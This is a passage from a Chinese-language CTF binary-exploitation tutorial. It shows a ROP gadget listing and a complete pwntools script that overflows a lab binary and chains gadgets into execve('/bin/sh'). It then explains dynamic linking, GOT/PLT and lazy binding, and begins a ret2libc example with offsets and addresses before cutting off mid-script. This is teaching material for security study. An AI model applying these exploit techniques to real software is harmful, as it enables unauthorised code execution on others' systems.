class="hljs-comment">; pop esi ; pop ebp ; ret</span><br><span class="hljs-number">0x0804838b</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="hljs-number">0x080a9a42</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="hljs-number">0x08096a26</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="hljs-number">0x08070d73</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="hljs-number">0x08048547</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="hljs-number">0x08049bfd</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="hljs-number">0x08048913</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x08049a19</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; pop edi ; ret 4</span><br><span class="hljs-number">0x08049a94</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop esi ; ret</span><br><span class="hljs-number">0x080481c9</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x080d7d3c</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; ret 0x6f9</span><br><span class="hljs-number">0x08099c87</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; ret 8</span><br><span class="hljs-number">0x0806eb91</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ecx</span> <span class="hljs-comment">; pop ebx ; ret</span><br><span class="hljs-number">0x0806336b</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">edi</span> <span class="hljs-comment">; pop esi ; pop ebx ; ret</span><br><span class="hljs-number">0x0806eb90</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">edx</span> <span class="hljs-comment">; pop ecx ; pop ebx ; ret</span><br><span class="hljs-number">0x0809ddd9</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span> <span class="hljs-comment">; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0806eb68</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">esi</span> <span class="hljs-comment">; pop ebx ; pop edx ; ret</span><br><span class="hljs-number">0x0805c820</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">esi</span> <span class="hljs-comment">; pop ebx ; ret</span><br><span class="hljs-number">0x08050256</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">esp</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="hljs-number">0x0807b6ed</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ss</span> <span class="hljs-comment">; pop ebx ; ret</span><br></code></pre></td></tr></table></figure><p>这里，我选择<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code>    这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Strings information</span><br><span class="hljs-section">============================================================</span><br>0x080be408 : /bin/sh<br></code></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Gadgets information</span><br><span class="hljs-section">============================================================</span><br>0x08049421 : int 0x80<br>0x080890b5 : int 0xcf<br></code></pre></td></tr></table></figure><p>同时，也找到对应的地址了。<br>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>在这里我们关注一下payload，如下是它的详细解释</p><ul><li><strong><code>flat</code> 函数</strong>：是 <code>pwn</code> 库中的一个函数，用于将多个元素（可以是整数、字符串等）扁平化为一个字节串。在这里，它将一系列元素组合成一个用于发送给目标程序的攻击载荷。</li><li><strong><code>pop_eax_ret, 0xb</code></strong>:<code>pop_eax_ret</code>是一个地址，指向一个包含<code>pop eax; ret</code>指令序列的内存位置。0xb对应的系统调用,是execve系统调用，它用于执行一个程序。将0xb放在pop_eax_ret之后，当pop eax指令执行时，会将0xb这个系统调用号放入 EAX 寄存器，为后续的系统调用做准备。</li><li>**<code>pop_edx_ecx_ebx_ret:</code>**同上，将0, 0, binsh放到对应寄存器中</li><li><strong><code>int_0x80</code>指令地址</strong>：<code>int_0x80</code>是一个地址，指向包含<code>int 0x80</code>指令的内存位置。在 x86 架构下，<code>int 0x80</code>是进行系统调用的触发指令。当 EAX 寄存器中已经设置好系统调用号（<code>0xb</code>），并且其他相关寄存器（如 EBX、ECX、EDX）也设置好了相应的参数后，执行<code>int_0x80</code>指令就可以触发系统调用，实现诸如执行一个 shell（<code>/bin/sh</code>）等操作。</li></ul><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理：-3"><a href="#原理：-3" class="headerlink" title="原理："></a>原理：</h3><p>ret2libc 这种攻击方式主要是针对 动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数，因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”) 来打开 shell。</p><h3 id="什么是动态链接"><a href="#什么是动态链接" class="headerlink" title="什么是动态链接"></a>什么是动态链接</h3><p>动态链接 是指在程序装载时通过 动态链接器 将程序所需的所有 动态链接库(Dynamic linking library) 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。它诞生的最主要的的原因就是 静态链接 太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在 静态链接 的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过 动态链接 的方式就推迟这个链接过程到了程序运行时进行。这样做有以下几点好处：</p><ol><li><strong>节省内存、磁盘空间：</strong><br>如磁盘中有两个程序，p1、p2，且他们两个都包含 lib.o 这个模块，在 静态链接 的情况下他们在链接输出可执行文件时都会包含 lib.o 这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似 lib.o 这种被多个程序共享的模块时，也就会造成很大空间的浪费。在 动态链接 的情况下，运行 p1 ，当系统发现需要用到 lib.o ，就会接着加载 lib.o 。这时我们运行 p2 ，就不需要重新加载 lib.o 了，因为此时 lib.o 已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个 lib.o 节省了内存空间。</li><li><strong>程序更新更简单:</strong><br>比如程序 p1 所使用的 lib.o 是由第三方提供的，等到第三方更新、或者为 lib.o 打补丁的时候，p1 就需要拿到第三方最新更新的 lib.o ，重新链接后在将其发布给用户。程序依赖的模块越多，就越发显得不方便，毕竟都是从网络上获取新资源。在 动态链接 的情况下，第三方更新 lib.o 后，理论上只需要覆盖掉原有的 lib.o ，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。</li><li><strong>增强程序扩展性和兼容性:</strong><br>动态链接 的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的动态链接文件，以此来实现程序功能的扩展。增强兼容性是表现在 动态链接 的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，如果是 静态链接 的程序会为不同平台发布不同的版本，而在 动态链接 的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了。<br>总而言之，动态链接 的程序在运行时会根据自己所依赖的 动态链接库 ，通过 动态链接器 将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux 系统中，ELF 动态链接文件被称为 动态共享对象（Dynamic Shared Objects） ， 简称 共享对象 一般都是以 “.so” 为扩展名的文件；在 windows 系统中就是常常软件报错缺少 xxx.dll 文件。</li></ol><h3 id="GOT与PLT"><a href="#GOT与PLT" class="headerlink" title="GOT与PLT"></a>GOT与PLT</h3><hr><p>参考：</p><p><a href="https://www.yuque.com/cyberangel/rg9gdm/crpf61#">https://www.yuque.com/cyberangel/rg9gdm/crpf61#</a><br><a href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">https://blog.csdn.net/Zheng__Huang/article/details/119484353</a><br><a href="https://worktile.com/kb/p/30008">https://worktile.com/kb/p/30008</a></p><hr><p>这两个必须放到一起看。</p><p>**GOT(<code>Global Offset Table</code>|全局偏量表)**，包含所有需要动态链接的外部函数的地址（在第一次执行后）</p><p>**PLT(<code>Procedure Link Table</code>|过程链接表)**，过程链接表，包含调用外部函数的跳转指令（跳转到GOT表中），以及初始化外部调用指令（用于链接器动态绑定dl_runtime_resolve）</p><h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>首先，系统调用（call）了在动态对象里的函数，例如<code>scanf</code>用汇编表示就是如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call scanf@plt   #不是真的这样写，只是举个例子<br></code></pre></td></tr></table></figure><p>然后我们跟进一下，会发现有三行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp QWORD PTR [rip+0x200a4a]#0x201020<br>push 0x1<br>jmp 0x5b0<br></code></pre></td></tr></table></figure><p>意思是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 一个地址<br>push 一个值到栈<br>jmp 一个地址<br></code></pre></td></tr></table></figure><p>其实看函数名称就可以知道这里是<code>scanf</code>的PLT表，PLT是什么，先按下不表，我们先看第一个<code>jmp</code>跳到哪了。第一个<code>jmp</code>语句是<code>jmp QWORD PTR [rip+0x200a4a]#0x201020</code>，其中<code>QWORD PTR</code>是一个操作数大小限定符，<code>QWORD</code> 代表 “Quad - Word”，即 8 个字节（64 位）。<code>PTR</code> 是 “pointer” 的缩写，表示指针类型。所以 “QWORD PTR” 的意思是按照 8 字节（64 位）的大小来读取内存中的数据作为指针。最后的<code>[rip+0x200a4a]</code>是一种相对寻址方式，以<code>rip</code>的值为基础，加上偏移量<code>0x200a4a</code>，计算出一个内存地址，即为<code>0x201020</code>在这个内存地址上读取数据。而这个地址就是就是PLT表对应的GOT表，而<code>0x201020</code>正是储存着下一条命令<code>push</code>的内存地址，我们用gdb的命令查看一下内存就可以看到,这个<code>0x5d6</code>就是<code>push 0x1</code>的地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x201020：0x000005d60x000000000x000000000x0000000<br></code></pre></td></tr></table></figure><p>于是，我们就总结出了使用动态链接后的函数调用过程，即为</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">call</span> scnaf --&gt;</span> <span class="hljs-function"><span class="hljs-title">scanf</span>的PLT表 --&gt;</span> scanf的GOT表<br></code></pre></td></tr></table></figure><h4 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h4><p>上面是动态链接的工作过程的简述，下面我们讨论为什么要这样干：就是<strong>延迟绑定机制</strong>，这是一种在程序过程中动态链接库函数调用的优化机制。在动态链接中，程序中的函数调用可能会引用外部共享库（如 Linux 中的.so 文件）中的函数。延迟绑定机制不是在程序启动时就解析和绑定所有外部函数的地址，而是将这个过程推迟到函数第一次被调用时。但是此时此刻程序已经编译就好了，不可能把解析后的地址塞到程序要调用函数的那个地方，所以就需要PLT表和GOT表，其中，PLT表是一个代码段，包含了一系列用于调用外部函数的指令序列，而GOT 是一个数据段，用于存储外部函数的实际地址。</p><p>但是，这里就又有了一个新问题，当这个函数是第一次调用呢？即GOT表中还没有储存这个函数的实际地址的时候，程序有时怎样运行的呢，其实很简单，如下是<strong>首次调用流程</strong></p><ul><li>当程序第一次调用一个外部函数时，控制流会转到 PLT 中的相应条目。这个 PLT 条目会通过 GOT 中的相应条目来检查函数地址是否已经被解析。</li><li>由于是第一次调用，GOT 中的函数地址通常还未被解析，此时 PLT 中的代码会调用一个特殊的运行时解析函数（如在 Linux 系统中是<code>dl_runtime_resolve</code>）来查找并确定外部函数的实际地址。</li><li>一旦确定了函数地址，这个地址就会被存储在 GOT 中对应的位置。</li></ul><p>首次调用完后，GOT表中就储存了共享对象中某个函数的地址，下一次调用时，程序就会从GOT表中获取地址而不再需要运行时解析，这样就提高了后续调用的效率。</p><p>下面，我们来看一个实例，（来源：<a href="https://www.yuque.com/cyberangel/rg9gdm/crpf61#%EF%BC%89">https://www.yuque.com/cyberangel/rg9gdm/crpf61#）</a><br>编写两个模块，一个是程序自身的代码模块，另一个是共享对象模块。以此来学习动态链接的程序是如何进行模块内、模块间的函数调用和数据访问，共享文件如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*共享对象*/</span><br>got_extern.c<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> b;<br><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;test\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编写代码模块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*代码模块*/</span><br>got.c<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a;&lt;--<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> b;&lt;--<br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>; &lt;--<br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>a = <span class="hljs-number">1</span>;<br>b = <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span><br>&#123;<br>fun();<br>test();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hey!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解释一下带箭头的三句：</p><ul><li><code>static int a;</code>：声明了一个静态的整型全局变量 <code>a</code>。静态全局变量的特点是它的作用域仅限于当前源文件（在这个例子中就是 <code>got.c</code> 文件），其他源文件无法直接访问它。这里对 <code>a</code> 进行了声明但未初始化，在 C 语言中，未初始化的静态全局变量会被自动初始化为 0。</li><li><code>extern int b;</code>：声明了一个整型的外部变量 <code>b</code>。这表明 <code>b</code> 是在其他源文件中定义的，在当前源文件中只是声明要使用它。</li><li><code>extern void test();</code>：声明了一个外部函数 <code>test()</code>，说明这个函数是在其他源文件中定义的，同样在当前源文件中只是声明要使用它，在链接阶段需要和其定义所在的源文件进行正确链接。</li></ul><p>然后将代码模块和共享模块一同编译</p><p>之后用objdump（Linux自带的反汇编命令）查看反汇编代码<code>objdump -D -Mintel got：</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000011b9 &lt;fun&gt;:<br>    11b9:55                   push   ebp<br>    11ba:89 e5                mov    ebp,esp<br>    11bc:e8 63 00 00 00       call   1224 &lt;__x86.get_pc_thunk.ax&gt;<br>    11c1:05 3f 2e 00 00       add    eax,0x2e3f<br>    11c6:c7 80 24 00 00 00 01 mov    DWORD PTR [eax+0x24],0x1<br>    11cd:00 00 00 <br>    11d0:8b 80 ec ff ff ff    mov    eax,DWORD PTR [eax-0x14]<br>    11d6:c7 00 02 00 00 00    mov    DWORD PTR [eax],0x2<br>    11dc:90                   nop<br>    11dd:5d                   pop    ebp<br>    11de:c3                   ret    <br>000011df &lt;main&gt;:<br>    11df:8d 4c 24 04          lea    ecx,[esp+0x4]<br>    11e3:83 e4 f0             and    esp,0xfffffff0<br>    11e6:ff 71 fc             push   DWORD PTR [ecx-0x4]<br>    11e9:55                   push   ebp<br>    11ea:89 e5                mov    ebp,esp<br>    11ec:53                   push   ebx<br>    11ed:51                   push   ecx<br>    11ee:e8 cd fe ff ff       call   10c0 &lt;__x86.get_pc_thunk.bx&gt;<br>    11f3:81 c3 0d 2e 00 00    add    ebx,0x2e0d<br>    11f9:e8 bb ff ff ff       call   11b9 &lt;fun&gt;<br>    11fe:e8 5d fe ff ff       call   1060 &lt;test@plt&gt;<br>    1203:83 ec 0c             sub    esp,0xc<br>    1206:8d 83 08 e0 ff ff    lea    eax,[ebx-0x1ff8]<br>    120c:50                   push   eax<br>    120d:e8 2e fe ff ff       call   1040 &lt;printf@plt&gt;<br>    1212:83 c4 10             add    esp,0x10<br>    1215:b8 00 00 00 00       mov    eax,0x0<br>    121a:8d 65 f8             lea    esp,[ebp-0x8]<br>    121d:59                   pop    ecx<br>    121e:5b                   pop    ebx<br>    121f:5d                   pop    ebp<br>    1220:8d 61 fc             lea    esp,[ecx-0x4]<br>    1223:c3                   ret<br></code></pre></td></tr></table></figure><h5 id="模块内部调用："><a href="#模块内部调用：" class="headerlink" title="模块内部调用："></a>模块内部调用：</h5><p>main()函数中调用 fun()函数 ，指令为：<code>11f9:e8 bb ff ff ff       call   11b9 &lt;fun&gt;</code>，<br>fun() 函数所在的地址为 0x000011b9 ，机器码 e8 代表 call 指令，为什么后面是 bb ff ff ff 而不是 b9 11 00 00 （小端存储，数据的低位字节存于低地址，高位字节存于高地址。）呢？这后面的四个字节代表着目的地址相对于当前指令的下一条指令地址的偏移，即 0x11f9 + 0x5 + (-69) &#x3D; 0x11b9 ，0xffffffbb 是 -69 的补码形式，这样做就可以使程序无论被装载到哪里都会正常执行。（太底层了，理解就行）</p><h5 id="模块内部数据访问"><a href="#模块内部数据访问" class="headerlink" title="模块内部数据访问"></a>模块内部数据访问</h5><p>ELF 文件是由很多很多的 段(segment) 所组成，常见的就如 .text (代码段) 、.data(数据段，存放已经初始化的全局变量或静态变量)、.bss(数据段，存放未初始化全局变量)等，这样就能做到数据与指令分离互不干扰。在同一个模块中，一般前面的内存区域存放着代码后面的区域存放着数据(这里指的是 .data 段)。那么指令是如何访问远在 .data 段 中的数据呢?</p><p>观察 fun() 函数中给静态变量 a 赋值的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">11bc:e8 63 00 00 00       call   1224 &lt;__x86.get_pc_thunk.ax&gt;<br>   11c1:05 3f 2e 00 00       add    eax,0x2e3f<br>   11c6:c7 80 24 00 00 00 01 mov    DWORD PTR [eax+0x24],0x1<br>   11cd:00 00 00<br></code></pre></td></tr></table></figure><p>它首先调用了 __x86.get_pc_thunk.ax() 函数， __x86.get_pc_thunk.ax()函数代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00001224 &lt;__x86.get_pc_thunk.ax&gt;:<br>   1224:8b 04 24             mov    eax,DWORD PTR [esp]<br>   1227:c3                   ret<br></code></pre></td></tr></table></figure><p>这个函数的作用就是把返回地址的值放到 eax 寄存器中，也就是把0x000011c1保存到eax中，然后再加上 0x2e3f ，最后再加上 0x24 。即 0x000011c1 + 0x2e3f + 0x24 &#x3D; 0x4024，这个值就是相对于模块加载基址的值。通过这样就能访问到模块内部的数据。</p><img src = "https://cdn.nlark.com/yuque/0/2020/jpeg/574026/1596598382550-b6dd6a15-25e9-42c5-a30d-6e12e0991dbb.jpeg?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_20%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_690%2Climit_0%2Finterlace%2C1"><h5 id="模块间数据访问"><a href="#模块间数据访问" class="headerlink" title="模块间数据访问"></a>模块间数据访问</h5><p>变量 b 被定义在其他模块中，其地址需要在程序装载时才能够确定。利用到前面的代码地址无关的思想，把地址相关的部分放入数据段中，然而这里的变量 b 的地址与其自身所在的模块装载的地址有关。解决：ELF 中在数据段里面建立了一个指向这些变量的指针数组，也就是我们所说的 GOT 表(Global offset Table， 全局偏移表 ），它的功能就是当代码需要引用全局变量时，可以通过 GOT 表间接引用。</p><p>查看反汇编代码中是如何访问变量 b 的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">11bc:e8 63 00 00 00       call   1224 &lt;__x86.get_pc_thunk.ax&gt;<br>   11c1:05 3f 2e 00 00       add    eax,0x2e3f<br>   11c6:c7 80 24 00 00 00 01 mov    DWORD PTR [eax+0x24],0x1<br>   11cd:00 00 00 <br>   11d0:8b 80 ec ff ff ff    mov    eax,DWORD PTR [eax-0x14]<br>   11d6:c7 00 02 00 00 00    mov    DWORD PTR [eax],0x2<br></code></pre></td></tr></table></figure><p>计算变量 b 在 GOT 表中的位置，0x11c1 + 0x2e3f - 0x14 &#x3D; 0x3fec ，查看 GOT 表的位置。<br>命令 objdump -h got ，查看ELF文件中的节头内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.got          00000018  00003fe8  00003fe8  00002fe8  2**2<br></code></pre></td></tr></table></figure><p>这里可以看到 .got 在文件中的偏移是 0x00003fe8，现在来看在动态连接时需要重定位的项，使用 objdump -R got 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00003fec R_386_GLOB_DAT    b<br></code></pre></td></tr></table></figure><p>可以看到变量b的地址需要重定位，位于0x00003fec，在GOT表中的偏移就是4，也就是第二项(每四个字节为一项)，这个值正好对应之前通过指令计算出来的偏移值。</p><h5 id="模块间函数调用"><a href="#模块间函数调用" class="headerlink" title="模块间函数调用"></a>模块间函数调用</h5><p>模块间函数调用用到了延迟绑定，都是函数名@plt的形式</p><h3 id="DEP防护"><a href="#DEP防护" class="headerlink" title="DEP防护"></a>DEP防护</h3><p>开启之后栈上就没有可执行权限了，和NX保护很像</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p><em>这个实例先对简单，和ret2text很像</em></p><p><strong>示例：</strong><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1</a></p><p>查一下保护，开启了NX保护，32位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:       i386-32-little<br>RELRO:      Partial RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x8048000)<br>Stripped:   No<br>Debuginfo:  Yes<br></code></pre></td></tr></table></figure><p>查看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现了溢出点<code>gets(s);</code>，查看栈，或者手动测量，得知偏移量是112字节（0x70）</p><p>然后我们找<code>/bin/sh</code>地址为<code>0x08048720</code></p><p>然后我们找<code>system</code>函数，它在<code>secure</code>函数中被调用，但是它在动态库中，所以我们可以找到<code>system@plt</code>的地址，我们可以直接覆盖函数返回地址使其调用 system()@plt 模拟 system() 函数真实调用。地址为<code>08048460</code></p><p>于是，我们就可以构架如下exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 